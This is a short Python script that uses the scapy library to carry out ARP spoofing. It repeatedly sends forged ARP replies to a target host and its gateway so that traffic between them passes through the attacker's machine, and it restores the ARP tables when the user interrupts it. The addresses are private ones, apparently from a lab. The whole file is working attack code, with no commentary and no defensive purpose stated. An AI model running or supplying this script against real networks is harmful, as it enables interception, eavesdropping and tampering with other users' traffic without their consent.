#!/usr/bin/env python

import scapy.all as scapy
import time

def get_mac(ip):
    arpReq = scapy.ARP(pdst=ip)
    brodcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_req_brodcast = brodcast / arpReq
    ans = scapy.srp(arp_req_brodcast, timeout=1, verbose=False)[0]

    return ans[0][1].hwsrc


def spoofer(targetIp, spoofIP):
    targetMac = get_mac(targetIp)
    packet = scapy.ARP(op=2, pdst=targetIp, hwdst=targetMac, psrc=spoofIP)
    scapy.send(packet, verbose=False)

def restore(destip, sourceip):
    destmac = get_mac(destip)
    sourcemac = get_mac(sourceip)
    packet = scapy.ARP(op=2, pdst=destip, hwdst=destmac, psrc=sourceip, hwsrc=sourcemac)
    scapy.send(packet, count=4, verbose=False)

target_ip = "10.0.2.7"
gateway_ip = "10.0.2.1"


try:
    sent_packets_count = 0
    while True:
        spoofer(target_ip, gateway_ip)
        spoofer(gateway_ip, target_ip)
        sent_packets_count = sent_packets_count + 2
        print("\r[+] Packets sent: " + str(sent_packets_count), end ="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] Detected Ctrl+C .......resetting ARP tables")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)